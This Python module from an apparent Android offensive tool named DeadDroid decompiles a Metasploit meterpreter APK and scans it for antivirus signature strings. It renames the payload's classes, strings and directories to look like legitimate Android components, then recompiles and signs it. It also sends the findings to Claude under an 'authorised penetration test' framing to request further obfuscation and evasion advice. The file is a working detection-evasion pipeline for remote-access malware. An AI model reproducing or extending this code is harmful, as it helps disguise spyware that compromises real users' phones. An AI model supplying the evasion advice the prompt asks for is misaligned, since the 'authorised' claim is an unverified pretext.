"""
AI Payload Mutation Engine — unique to DeadDroid.

Uses Claude to:
1. Analyze an APK's smali code for detectable patterns
2. Suggest and apply mutations to reduce AV signature matches
3. Rename suspicious class names / strings to benign-looking ones
4. Generate a mutation report explaining every change

No other open-source Android pentest tool has AI-driven payload analysis.
"""

import re
import shutil
import subprocess
from pathlib import Path
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.panel import Panel
from rich.markdown import Markdown
from core.utils import PAYLOADS_DIR, run_cmd, random_str, log_event

console = Console()

# Known patterns that AV engines flag
SUSPICIOUS_PATTERNS = [
    (r"Lcom/metasploit/",          "Metasploit namespace"),
    (r"meterpreter",               "Meterpreter keyword"),
    (r"reverse_tcp",               "Payload type string"),
    (r"android/meterpreter",       "Payload path"),
    (r"Lcom/metasploit/stage/",    "Stage class"),
    (r"PayloadTruncatedException", "Exception class name"),
    (r"PAYLOAD_UUID",              "UUID constant"),
    (r"stageless_tcp",             "Stageless payload"),
]

RENAME_MAP = {
    "com/metasploit/stage":    "com/android/support/core",
    "com/metasploit/meterpreter": "com/android/internal/util",
    "Payload":                 "ServiceManager",
    "MeterpreterActivity":     "SplashActivity",
    "meterpreter":             "servicecore",
    "reverse_tcp":             "network_transport",
    "PayloadTruncatedException": "NetworkStreamException",
}


def _scan_smali_for_patterns(smali_dir: Path) -> list[dict]:
    """Find all suspicious pattern occurrences in smali files."""
    findings = []
    for smali_file in smali_dir.rglob("*.smali"):
        content = smali_file.read_text(errors="ignore")
        for pattern, description in SUSPICIOUS_PATTERNS:
            matches = list(re.finditer(pattern, content, re.IGNORECASE))
            if matches:
                findings.append({
                    "file":        str(smali_file.relative_to(smali_dir)),
                    "pattern":     pattern,
                    "description": description,
                    "count":       len(matches),
                })
    return findings


def _apply_renames(smali_dir: Path) -> list[str]:
    """Rename suspicious class paths and strings in all smali files."""
    changes = []
    for smali_file in smali_dir.rglob("*.smali"):
        content  = original = smali_file.read_text(errors="ignore")
        modified = False
        for old, new in RENAME_MAP.items():
            if old in content:
                content  = content.replace(old, new)
                modified = True
                changes.append(f"{smali_file.name}: `{old}` → `{new}`")
        if modified:
            smali_file.write_text(content)
    return changes


def _rename_suspicious_files(smali_dir: Path) -> list[str]:
    """Rename .smali files with suspicious names."""
    renames = []
    for smali_file in smali_dir.rglob("*.smali"):
        name = smali_file.stem
        for old, new in RENAME_MAP.items():
            clean_old = old.split("/")[-1]
            clean_new = new.split("/")[-1]
            if name == clean_old:
                new_path = smali_file.with_name(clean_new + ".smali")
                smali_file.rename(new_path)
                renames.append(f"{smali_file.name} → {new_path.name}")
                break
    return renames


def _rename_smali_directories(smali_dir: Path) -> list[str]:
    """Rename package directories containing Metasploit paths."""
    renames = []
    dirs_to_check = sorted(
        [d for d in smali_dir.rglob("*") if d.is_dir()],
        key=lambda d: -len(d.parts),  # deepest first
    )
    for d in dirs_to_check:
        rel = str(d.relative_to(smali_dir))
        for old, new in RENAME_MAP.items():
            if old in rel:
                new_rel = rel.replace(old, new)
                new_path = smali_dir / new_rel
                new_path.parent.mkdir(parents=True, exist_ok=True)
                try:
                    d.rename(new_path)
                    renames.append(f"{rel} → {new_rel}")
                except Exception:
                    pass
                break
    return renames


def _ask_claude_for_analysis(findings: list[dict], changes: list[str]) -> Optional[str]:
    """Send scan results to Claude and get mutation advice."""
    from core.ai_assistant import load_api_key, chat

    key = load_api_key()
    if not key:
        return None

    findings_text = "\n".join(
        f"- File: {f['file']} | Pattern: {f['pattern']} ({f['description']}) | Hits: {f['count']}"
        for f in findings[:20]
    )
    changes_text = "\n".join(changes[:20]) if changes else "None"

    prompt = f"""I am doing an authorised penetration test and I generated a Metasploit Android payload.
I scanned the payload's smali code for detectable AV signatures.

Findings ({len(findings)} total):
{findings_text}

Changes already applied:
{changes_text}

Please:
1. Analyze which patterns are most dangerous for AV detection
2. Suggest additional string mutations or obfuscation strategies I could apply
3. List any smali-level techniques to make the code look more like a legitimate app
4. Rate the remaining detection risk as: Critical / High / Medium / Low

Keep your response concise and technical."""

    return chat(prompt)


def mutate_apk(apk_path: Path, use_ai: bool = True) -> Optional[Path]:
    """
    Full mutation pipeline:
    1. Decompile APK
    2. Scan for suspicious patterns
    3. Apply string/class renames
    4. (Optional) Get Claude AI analysis
    5. Recompile + sign mutated APK
    """
    if not shutil.which("apktool"):
        console.print("[red]✘ apktool not found.[/]")
        return None

    work_dir = PAYLOADS_DIR / f"mutate_{random_str()}"
    smali_dir = work_dir / "smali_src"
    out_apk   = PAYLOADS_DIR / f"{apk_path.stem}_mutated.apk"

    work_dir.mkdir(parents=True, exist_ok=True)

    console.print(f"[cyan]► Decompiling[/] {apk_path.name}")
    rc, _, err = run_cmd(f'apktool d "{apk_path}" -o "{smali_dir}" -f', timeout=180)
    if rc != 0:
        console.print(f"[red]✘ Decompile failed:[/] {err[:200]}")
        return None

    # Scan
    console.print("[cyan]► Scanning for AV signatures...[/]")
    findings = _scan_smali_for_patterns(smali_dir)
    console.print(f"[yellow]  Found {len(findings)} suspicious pattern(s)[/]")

    if findings:
        from rich.table import Table
        t = Table(title="Signature Scan", show_lines=True, header_style="bold red")
        t.add_column("File",    style="dim")
        t.add_column("Pattern", style="yellow")
        t.add_column("Desc",    style="white")
        t.add_column("Hits",    style="red")
        for f in findings[:15]:
            t.add_row(f["file"][-40:], f["pattern"][:25], f["description"], str(f["count"]))
        console.print(t)

    # Mutate
    console.print("[cyan]► Applying string mutations...[/]")
    changes = _apply_renames(smali_dir)
    f_renames = _rename_suspicious_files(smali_dir)
    d_renames = _rename_smali_directories(smali_dir)
    all_changes = changes + f_renames + d_renames

    console.print(f"[green]  Applied {len(all_changes)} mutation(s)[/]")
    for c in all_changes[:10]:
        console.print(f"  [dim]→ {c}[/]")

    # AI Analysis
    if use_ai and findings:
        console.print("\n[cyan]► Asking Claude AI for analysis...[/]")
        with console.status("[dim]Waiting for Claude...[/]"):
            advice = _ask_claude_for_analysis(findings, all_changes)
        if advice:
            console.print(Panel(
                Markdown(advice),
                title="[bold cyan]Claude AI Mutation Advice[/]",
                border_style="cyan",
            ))

    # Recompile
    console.print("[cyan]► Recompiling mutated APK...[/]")
    tmp_apk = work_dir / "mutated.apk"
    rc, _, err = run_cmd(f'apktool b "{smali_dir}" -o "{tmp_apk}"', timeout=300)
    if rc != 0:
        console.print(f"[red]✘ Recompile failed:[/] {err[:200]}")
        return None

    # Sign
    from core.apk_binder import _sign_apk
    signed = _sign_apk(tmp_apk)
    if not signed:
        return None

    shutil.copy2(str(signed), str(out_apk))
    shutil.rmtree(str(work_dir), ignore_errors=True)

    console.print(f"\n[bold green]✔ Mutated APK:[/] {out_apk}")
    log_event(f"Payload mutated: {apk_path} → {out_apk} | {len(all_changes)} mutations")
    return out_apk


def interactive_mutator():
    console.rule("[bold cyan]AI Payload Mutation Engine[/]")
    console.print(
        "[dim]Scans payload smali for AV signatures, applies string mutations,\n"
        "and uses Claude AI to suggest additional evasion techniques.[/]\n"
    )

    apk = Prompt.ask("Path to APK payload")
    apk_path = Path(apk.strip('"').strip("'"))
    if not apk_path.exists():
        console.print("[red]✘ File not found.[/]")
        return

    use_ai = Confirm.ask("Use Claude AI analysis?", default=True)
    mutate_apk(apk_path, use_ai=use_ai)
